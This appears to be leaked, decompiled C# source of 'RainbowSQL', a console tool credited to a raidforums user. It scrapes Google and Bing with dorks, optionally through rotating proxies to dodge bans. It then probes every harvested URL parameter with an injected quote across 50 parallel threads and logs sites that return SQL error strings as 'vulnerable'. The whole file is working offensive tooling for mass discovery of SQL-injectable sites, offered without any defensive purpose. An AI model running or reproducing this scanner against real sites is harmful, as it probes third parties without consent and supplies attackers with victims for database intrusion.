using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Web;
using HtmlAgilityPack;

namespace RainbowSQL //dumped by raidforums.com/User-thekilob pastebin.com/u/kilo
	//next time, if you don't wanna release your source code, you might wanna obfuscate and pack ;)
{
	internal class Program
	{
		private static void Main(string[] args)
		{
			Program.PrintData();
			Program.RunOption();
			Console.ReadKey();
		}

		private static void RunOption()
		{
			try
			{
				switch (Convert.ToInt32(Console.ReadLine()))
				{
				case 1:
					Program.DorkScannerBing();
					break;
				case 2:
					Program.DorkScannerGoogle();
					break;
				case 3:
					Program.ScanVulns(true);
					break;
				case 4:
					Program.FuckInternet();
					break;
				default:
					Console.Clear();
					Program.PrintData();
					Program.RunOption();
					break;
				}
			}
			catch
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("[!] Wrong option! Please restart.");
				Console.ReadKey();
				Environment.Exit(1);
			}
		}

		private static void FuckInternet()
		{
			Program.DorkScannerBing();
			Program.ScanVulns(false);
			Console.ReadKey();
		}

		private static void ScanVulns(bool check)
		{
			if (check)
			{
				Console.ForegroundColor = ConsoleColor.White;
				Console.WriteLine("[I] Put all urls in urls.txt file and click Enter.");
				Console.ReadKey();
				Program.LoadUrls();
			}
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("[I] Starting SQL checker!");
			int fromInclusive = 0;
			int count = Program.urls.Count;
			ParallelOptions parallelOptions = new ParallelOptions();
			parallelOptions.MaxDegreeOfParallelism = 50;
			Parallel.For(fromInclusive, count, parallelOptions, delegate(int i)
			{
				Program.InjectError(Program.urls[i]);
				Program.Processed++;
			});
			Console.ForegroundColor = ConsoleColor.Green;
			Console.WriteLine("\n[S] Checking ended! Found " + Program.vulnerable.Count<string>().ToString() + " vulnerable urls.");
			File.WriteAllLines("vulnerable.txt", Program.vulnerable);
		}

		private static void PrintData()
		{
			Console.ForegroundColor = ConsoleColor.Blue;
			Console.Write("\r\n------------------------------------------------------------------------------------\r\n|  __________        .__      ___.                   _________________  .____      |\r\n|  \\______   \\_____  |__| ____\\_ |__   ______  _  __/   _____/\\_____  \\ |    |     |\r\n|   |       _/\\__  \\ |  |/    \\| __ \\ /  _ \\ \\/ \\/ /\\_____  \\  /  / \\  \\|    |     |\r\n|   |    |   \\ / __ \\|  |   |  \\ \\_\\ (  <_> )     / /        \\/   \\_/.  \\    |___  |\r\n|   |____|_  /(____  /__|___|  /___  /\\____/ \\/\\_/ /_______  /\\_____\\ \\_/_______ \\ |\r\n|          \\/      \\/        \\/    \\/                      \\/        \\__>       \\/ |\r\n|Made by syrex1013 | dumped by raidforums.com/User-thekilob pastebin.com/u/kilo    |\r\n------------------------------------------------------------------------------------\r\n");
			Console.ForegroundColor = ConsoleColor.Blue;
			Console.WriteLine("[1] Dork Scanner - Bing");
			Console.WriteLine("[2] Dork Scanner - Google");
			Console.WriteLine("[3] Vuln Scanner");
			Console.WriteLine("[4] Dork&Vuln Scanner");
			Console.ForegroundColor = ConsoleColor.White;
		}

		private static void LoadUrls()
		{
			try
			{
				string[] array = File.ReadAllLines("urls.txt");
				foreach (string item in array)
				{
					Program.urls.Add(item);
				}
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("[S] Urls loaded: " + Program.urls.Count<string>().ToString());
			}
			catch
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("[!] No urls file found. Please restart!");
				Console.ReadKey();
				Environment.Exit(1);
			}
		}

		private static void LoadDorks()
		{
			try
			{
				string[] array = File.ReadAllLines("dorks.txt");
				foreach (string item in array)
				{
					Program.dorks.Add(item);
				}
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("[S] Dorks loaded: " + Program.dorks.Count<string>().ToString());
			}
			catch
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("[!] No dork file found. Please restart!");
				Console.ReadKey();
				Environment.Exit(1);
			}
		}

		private static void LoadProxies()
		{
			try
			{
				string[] array = File.ReadAllLines("proxy.txt");
				foreach (string item in array)
				{
					Program.proxies.Add(item);
				}
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("[S] Proxies loaded: " + Program.proxies.Count<string>().ToString());
			}
			catch
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("[!] No proxy file found. Please restart!");
				Console.ReadKey();
				Environment.Exit(1);
			}
		}

		private static void InjectError(string url)
		{
			WebClient webClient = new WebClient();
			UriBuilder uriBuilder = new UriBuilder(url);
			NameValueCollection nameValueCollection = HttpUtility.ParseQueryString(uriBuilder.Query);
			foreach (object obj in nameValueCollection)
			{
				string text = (string)obj;
				string str = nameValueCollection[text] + "'";
				string oldValue = HttpUtility.UrlEncode(text) + "=" + HttpUtility.UrlEncode(nameValueCollection[text]);
				string newValue = HttpUtility.UrlEncode(text) + "=" + HttpUtility.UrlEncode(str);
				uriBuilder.Query = nameValueCollection.ToString().Replace(oldValue, newValue);
				string address = uriBuilder.ToString();
				try
				{
					string htmlCode = webClient.DownloadString(address);
					Console.Write(string.Concat(new string[]
					{
						"\rStats(Vulnerable/Processed/All): ",
						Program.vulnerable.Count<string>().ToString(),
						"/",
						Program.Processed.ToString(),
						"/",
						Program.urls.Count<string>().ToString()
					}));
					bool flag = Program.SQL_Errors.Any((string c) => htmlCode.Contains(c));
					if (flag)
					{
						bool flag2 = !Program.vulnerable.Contains(url);
						if (flag2)
						{
							Program.vulnerable.Add(url);
							File.AppendAllText("vulnerable.txt", "\n" + url);
						}
					}
				}
				catch
				{
				}
			}
		}

		private static void DorkScannerGoogle()
		{
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("[I] Put all dorks in dorks.txt file and click Enter.");
			Console.ReadKey();
			Program.LoadDorks();
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("[I] Please specify number of pages per dork! (minimum 2 pages)");
			try
			{
				int pages = Convert.ToInt32(Console.ReadLine());
				Console.WriteLine("[I] Do you want to use proxies(y/n)?");
				string option = Console.ReadLine().ToLower();
				bool flag = option == "y";
				if (flag)
				{
					Console.ForegroundColor = ConsoleColor.White;
					Console.WriteLine("[I] Put all proxies in proxy.txt file and click Enter.");
					Console.ReadKey();
					Program.LoadProxies();
					Console.ForegroundColor = ConsoleColor.White;
				}
				Console.WriteLine("[I] Starting scraping using Google!");
				Parallel.For(0, Program.dorks.Count, new ParallelOptions
				{
					MaxDegreeOfParallelism = 50
				}, delegate(int i)
				{
					bool flag2 = option == "y";
					if (flag2)
					{
						Program.GetLinksGoogle(Program.dorks[i], pages, true);
					}
					else
					{
						Program.GetLinksGoogle(Program.dorks[i], pages, false);
					}
				});
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("\n[S] Scraping ended! Found " + Program.urls.Count<string>().ToString() + " urls.");
				File.WriteAllLines("urls.txt", Program.urls);
			}
			catch
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("[!] Wrong number! Please restart.");
				Console.ReadKey();
				Environment.Exit(1);
			}
		}

		private static void GetLinksGoogle(string dork, int number_of_pages, bool proxy)
		{
			Program.MyWebClient myWebClient = new Program.MyWebClient();
			Program.Found_for_dork = 0;
			string item = "";
			myWebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/267.1.0.46.120;]");
			try
			{
				if (proxy)
				{
					string[] randomProxy = Program.GetRandomProxy();
					string text = randomProxy[0];
					bool flag = text == "0.0.0.0";
					if (flag)
					{
						Console.ForegroundColor = ConsoleColor.Red;
						Console.WriteLine("[!]All proxies have been banned!");
						File.WriteAllLines("urls.txt", Program.urls);
						Console.ReadKey();
						Environment.Exit(1);
					}
					int port = Convert.ToInt32(randomProxy[1]);
					item = randomProxy[2];
					myWebClient.Proxy = new WebProxy(text, port);
				}
				for (int i = 1; i < number_of_pages; i++)
				{
					int page = i * 50;
					string address = Program.CreateUrlGoogle(dork, page);
					string htmlCode = myWebClient.DownloadString(address);
					Program.ProcessHTML(htmlCode);
				}
			}
			catch (Exception ex)
			{
				if (proxy)
				{
					try
					{
						Program.proxies.Remove(item);
					}
					catch
					{
					}
				}
			}
		}

		private static void DorkScannerBing()
		{
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("[I] Put all dorks in dorks.txt file and click Enter.");
			Console.ReadKey();
			Program.LoadDorks();
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("[I] Please specify number of pages per dork! (minimum 2 pages)");
			try
			{
				int pages = Convert.ToInt32(Console.ReadLine());
				Console.ForegroundColor = ConsoleColor.White;
				Console.WriteLine("[I] Do you want to use proxies(y/n)?");
				string option = Console.ReadLine().ToLower();
				bool flag = option == "y";
				if (flag)
				{
					Console.ForegroundColor = ConsoleColor.White;
					Console.WriteLine("[I] Put all proxies in proxy.txt file and click Enter.");
					Console.ReadKey();
					Program.LoadProxies();
					Console.ForegroundColor = ConsoleColor.White;
				}
				Console.WriteLine("[I] Starting scraping using Bing!");
				Parallel.For(0, Program.dorks.Count, new ParallelOptions
				{
					MaxDegreeOfParallelism = 50
				}, delegate(int i)
				{
					bool flag2 = option == "y";
					if (flag2)
					{
						Program.GetLinksBing(Program.dorks[i], pages, true);
					}
					else
					{
						Program.GetLinksBing(Program.dorks[i], pages, false);
					}
				});
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("\n[S] Scraping ended! Found " + Program.urls.Count<string>().ToString() + " urls.");
				File.WriteAllLines("urls.txt", Program.urls);
			}
			catch
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("[!] Wrong number! Please restart.");
				Console.ReadKey();
				Environment.Exit(1);
			}
		}

		private static void GetLinksBing(string dork, int number_of_pages, bool proxy)
		{
			Program.MyWebClient myWebClient = new Program.MyWebClient();
			Program.Found_for_dork = 0;
			string item = "";
			myWebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/267.1.0.46.120;]");
			try
			{
				if (proxy)
				{
					string[] randomProxy = Program.GetRandomProxy();
					string text = randomProxy[0];
					bool flag = text == "0.0.0.0";
					if (flag)
					{
						Console.ForegroundColor = ConsoleColor.Red;
						Console.WriteLine("[!]All proxies have been banned!");
						File.WriteAllLines("urls.txt", Program.urls);
						Console.ReadKey();
						Environment.Exit(1);
					}
					int port = Convert.ToInt32(randomProxy[1]);
					item = randomProxy[2];
					myWebClient.Proxy = new WebProxy(text, port);
				}
				for (int i = 1; i < number_of_pages; i++)
				{
					int page = i * 50;
					string address = Program.CreateBingUrl(dork, page);
					string htmlCode = myWebClient.DownloadString(address);
					Program.ProcessHTML(htmlCode);
				}
			}
			catch (Exception ex)
			{
				if (proxy)
				{
					try
					{
						Program.proxies.Remove(item);
					}
					catch
					{
					}
				}
			}
		}

		private static void ProcessHTML(string htmlCode)
		{
			HtmlDocument htmlDocument = new HtmlDocument();
			htmlDocument.LoadHtml(htmlCode);
			foreach (HtmlNode htmlNode in ((IEnumerable<HtmlNode>)htmlDocument.DocumentNode.SelectNodes("//a[@href]")))
			{
				string attributeValue = htmlNode.GetAttributeValue("href", string.Empty);
				bool flag = attributeValue.Contains("http") && attributeValue.Contains("=") && !attributeValue.Contains("google") && !attributeValue.Contains("bing") && !attributeValue.Contains("microsoft") && !attributeValue.Contains("youtube");
				if (flag)
				{
					Program.urls.Add(attributeValue);
					Program.Found_for_dork++;
					Console.Write("\rSTATS(URLS/ALL_PROXIES) " + Program.urls.Count<string>().ToString() + "/" + Program.proxies.Count<string>().ToString());
					File.AppendAllText("urls.txt", "\n" + attributeValue);
				}
			}
		}

		private static string CreateUrlGoogle(string dork, int Page)
		{
			return string.Format("https://www.google.com/search?q={0}&start={1}&num=50", dork, Page);
		}

		private static string CreateBingUrl(string dork, int Page)
		{
			return string.Format("http://www.bing.com/search?q={0}&go=Submit&first={1}&count=50", dork, Page);
		}

		private static string[] GetRandomProxy()
		{
			bool flag = Program.proxies.Count != 0;
			string[] result;
			if (flag)
			{
				int index = Program.random.Next(Program.proxies.Count);
				string text = Program.proxies[index].Split(new char[]
				{
					':'
				})[0];
				string[] array = new string[]
				{
					text,
					Convert.ToInt32(Program.proxies[index].Split(new char[]
					{
						':'
					})[1]).ToString(),
					Program.proxies[index]
				};
				result = array;
			}
			else
			{
				string[] array2 = new string[]
				{
					"0.0.0.0",
					"0"
				};
				result = array2;
			}
			return result;
		}

		private static List<string> proxies = new List<string>();

		private static List<string> dorks = new List<string>();

		private static List<string> urls = new List<string>();

		private static List<string> vulnerable = new List<string>();

		private static Random random = new Random();

		private static string[] SQL_Errors = new string[] //this guy only put 6 lmao
		{
			"mysql_fetch",
			"SQL syntax",
			"ORA-01756",
			"OLE DB Provider for SQL Server",
			"SQLServer JDBC Driver",
			"Error Executing Database Query"
		};

		private static int Processed = 0;

		private static int Bad_proxies = 0;

		private static int Found_for_dork = 0;

		private class MyWebClient : WebClient
		{
			protected override WebRequest GetWebRequest(Uri uri)
			{
				WebRequest webRequest = base.GetWebRequest(uri);
				webRequest.Timeout = 10000;
				return webRequest;
			}
		}
	}
}
